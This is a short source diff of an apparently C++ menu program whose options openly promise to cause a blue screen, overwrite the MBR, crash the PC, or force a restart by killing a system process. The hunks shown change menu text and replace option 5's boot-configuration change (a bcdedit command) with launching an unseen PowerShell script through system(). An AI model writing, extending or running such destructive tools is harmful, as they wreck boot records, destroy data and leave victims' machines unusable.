@@ -41,8 +41,8 @@ int main() {
 		cout << "1 - Causes BSOD\n";
 		cout << "2 - Overwrites MBR\n";
 		cout << "3 - Might crash your PC\n";
-		cout << "4 - Forces PC to restart by killing system process)\n";
-		cout << "5 - A 10K bug\n";
+		cout << "4 - Forces PC to restart by killing system process\n";
+		cout << "5 - Causes system to reboot with a BSOD\n";
 	}
 
 	if (c == 1) {
@@ -80,8 +80,7 @@ int main() {
 	}
 
 	if (c == 5) {
-		system("bcdedit /set optionsedit 1");
-
+		system("start powershell.exe .\test.ps1");
 	}
 	system("pause");
 }
